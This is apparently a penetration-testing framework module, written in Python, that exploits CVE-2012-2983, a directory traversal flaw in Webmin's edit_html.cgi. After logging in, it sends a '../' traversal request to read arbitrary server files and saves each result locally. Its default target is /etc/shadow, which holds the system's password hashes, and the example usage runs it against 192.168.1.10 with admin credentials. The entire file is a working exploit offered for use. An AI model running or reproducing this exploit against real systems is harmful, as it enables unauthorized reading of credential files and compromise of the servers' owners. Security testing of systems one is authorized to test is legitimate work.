#!/usr/bin/env python3
"""
Webmin edit_html.cgi Parameter Traversal Arbitrary File Access
===============================================================

Exploits CVE-2012-2983 to read arbitrary files via directory traversal
in Webmin's edit_html.cgi script.

Author: Brainless Security Team
Module: auxiliary/admin/webmin/edit_html_fileaccess
Type: auxiliary
Rank: excellent
"""

import os
import sys
import requests
import urllib.parse
import re
from pathlib import Path

# Add framework path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.logger import LoggerMixin

# Disable SSL warnings (self-signed certs are common in Webmin)
requests.packages.urllib3.disable_warnings()

NAME = "Webmin edit_html.cgi File Access"
DESCRIPTION = "Exploits CVE-2012-2983 to read arbitrary files via directory traversal"
AUTHOR = "Brainless Security Team"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "auxiliary"


class WebminFileAccess(LoggerMixin):
    """
    Webmin edit_html.cgi directory traversal exploit
    """

    def __init__(self):
        super().__init__('WebminFileAccess')
        self.target = ""
        self.port = 10000
        self.ssl = True
        self.username = ""
        self.password = ""
        self.depth = 4
        self.rpath = "/etc/shadow"
        self.session = requests.Session()
        self.file_content = ""

    def set_option(self, option: str, value: str):
        """Set module options"""
        if option.lower() == 'target':
            self.target = value
        elif option.lower() == 'port':
            self.port = int(value)
        elif option.lower() == 'ssl':
            self.ssl = value.lower() == 'true'
        elif option.lower() == 'username':
            self.username = value
        elif option.lower() == 'password':
            self.password = value
        elif option.lower() == 'depth':
            self.depth = int(value)
        elif option.lower() == 'rpath':
            self.rpath = value

    def get_options(self) -> dict:
        """Get module options"""
        return {
            'TARGET': {'description': 'Target IP address or hostname', 'required': True, 'default': ''},
            'PORT': {'description': 'Webmin port', 'required': False, 'default': '10000'},
            'SSL': {'description': 'Use SSL/HTTPS', 'required': False, 'default': 'true'},
            'USERNAME': {'description': 'Webmin username', 'required': True, 'default': ''},
            'PASSWORD': {'description': 'Webmin password', 'required': True, 'default': ''},
            'DEPTH': {'description': 'Directory traversal depth', 'required': False, 'default': '4'},
            'RPATH': {'description': 'Remote file path to read', 'required': False, 'default': '/etc/shadow'}
        }

    def base_url(self):
        """Get base URL for Webmin"""
        proto = "https" if self.ssl else "http"
        return f"{proto}://{self.target}:{self.port}"

    def login(self):
        """Attempt to login to Webmin"""
        self.info("Attempting to login...")

        url = f"{self.base_url()}/session_login.cgi"
        data = {
            "page": "/",
            "user": self.username,
            "pass": self.password
        }

        headers = {
            "Cookie": "testing=1"
        }

        try:
            r = self.session.post(
                url,
                data=data,
                headers=headers,
                allow_redirects=False,
                verify=False,
                timeout=25
            )

            if r.status_code == 302:
                cookies = r.headers.get("Set-Cookie", "")
                match = re.search(r"sid=([A-Za-z0-9]+)", cookies)
                if match:
                    self.info("Authentication successful")
                    return True

            self.error("Authentication failed")
            return False

        except Exception as e:
            self.error(f"Login failed: {e}")
            return False

    def exploit(self):
        """Perform the directory traversal exploit"""
        self.info(f"Attempting to retrieve {self.rpath}...")

        traversal = "../" * self.depth + self.rpath
        encoded_traversal = urllib.parse.quote(traversal)

        url = (
            f"{self.base_url()}/file/edit_html.cgi"
            f"?file={encoded_traversal}&text=1"
        )

        try:
            r = self.session.get(
                url,
                verify=False,
                timeout=25
            )

            if r.status_code == 200 and traversal in r.text:
                match = re.search(r'name=body>(.*?)</textarea>', r.text, re.S)
                if match:
                    self.file_content = match.group(1)
                    filename = self.rpath.split("/")[-1]

                    # Save file to current directory
                    with open(filename, "w", encoding="utf-8", errors="ignore") as f:
                        f.write(self.file_content)

                    self.info(f"File saved as ./{filename}")
                    return True

            self.error("Failed to retrieve the file")
            return False

        except Exception as e:
            self.error(f"Exploit failed: {e}")
            return False

    def run(self) -> dict:
        """
        Main module execution
        """
        if not self.target:
            return {'success': False, 'message': 'Target not specified'}

        if not self.username or not self.password:
            return {'success': False, 'message': 'Username and password required'}

        try:
            self.info(f"Starting Webmin file access exploit against {self.target}:{self.port}")

            if not self.login():
                return {'success': False, 'message': 'Authentication failed'}

            if self.exploit():
                summary = {
                    'target': self.target,
                    'port': self.port,
                    'file_path': self.rpath,
                    'file_size': len(self.file_content),
                    'saved_as': self.rpath.split("/")[-1]
                }

                self.info("Exploit completed successfully")

                return {
                    'success': True,
                    'summary': summary,
                    'content': self.file_content
                }
            else:
                return {'success': False, 'message': 'Exploit failed'}

        except Exception as e:
            self.error(f"Module execution failed: {e}")
            return {'success': False, 'message': f'Execution failed: {str(e)}'}


def run(options: dict = None) -> dict:
    """
    Entry point for the module
    """
    exploit = WebminFileAccess()

    # Set options if provided
    if options:
        for key, value in options.items():
            exploit.set_option(key, value)

    return exploit.run()


if __name__ == '__main__':
    # Example usage
    options = {
        'TARGET': '192.168.1.10',
        'USERNAME': 'admin',
        'PASSWORD': 'password',
        'RPATH': '/etc/shadow',
        'DEPTH': '4'
    }

    result = run(options)
    print(result)
